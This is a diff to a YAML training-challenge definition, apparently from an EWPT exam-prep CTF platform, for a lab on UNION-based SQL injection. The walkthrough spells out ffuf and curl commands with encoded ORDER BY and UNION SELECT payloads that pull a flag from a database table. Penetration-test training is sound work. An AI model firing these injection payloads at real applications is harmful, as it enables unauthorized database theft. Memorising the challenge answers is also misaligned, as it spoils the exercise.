@@ -2,18 +2,23 @@ slug: ewpt-sqli-via-fuzzing
 name: SQL Injection via Fuzzing Wordlist (EWPT)
 category: web
 difficulty: medium
-lab_kind: static
-flag: FLAG{union_based_sqli_via_fuzzing}
+lab_kind: ewpt_119
 est_minutes: 25
 sort: 119
-description: |-
-  `http://sqli-fuzz.lab.local/product?id=1` is vulnerable. A fuzzing wordlist contains both benign and malicious payloads.
+description: '`http://sqli-fuzz.lab.local/product?id=1` is vulnerable. A fuzzing wordlist contains both
+  benign and malicious payloads.
 
-  **Objective:** Fuzz the `id` parameter, find a UNION-based SQL injection, and extract the flag from the `flags` table.
+
+  **Objective:** Fuzz the `id` parameter, find a UNION-based SQL injection, and extract the flag from
+  the `flags` table.
+
 
   **Exam topics:** Injection vulnerabilities; fuzzing; input validation.
 
-  _Isolated lab only (`*.lab.local` or your own Docker/VMs). Never expose these vulnerable services to the internet._
+
+  **Terminal lab:** Click Start Lab and read `README.txt`. Targets and tools run in the same simulated
+  browser terminal as the other terminal challenges; no external machines or DNS setup are needed. Type
+  `help` for available commands. Flags are unique to your lab session and use `MYCTF{...}`.'
 objectives:
 - Fuzz a query parameter
 - Find the column count with ORDER BY
@@ -32,8 +37,11 @@ hints:
   cost: 10
   body: Extract from flags.flag.
 remediation: Prepared statements; a least-privilege DB user; input validation.
-walkthrough: id=1 ORDER BY 3-- - confirms three columns. id=-1 UNION SELECT 1,2,flag FROM flags-- - returns
-  the flag.
+walkthrough: ffuf -u "http://sqli-fuzz.lab.local/product?id=FUZZ" -w sqli-payloads.txt -mc all reveals
+  column-count differences. curl "http://sqli-fuzz.lab.local/product?id=1%20ORDER%20BY%203--%20-" succeeds,
+  but ORDER BY 4 fails. curl "http://sqli-fuzz.lab.local/product?id=-1%20UNION%20SELECT%201,2,flag%20FROM%20flags--%20-"
+  extracts the flag.
 references:
 - title: OWASP WSTG - Testing for SQL Injection
   url: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+dynamic_flag: true
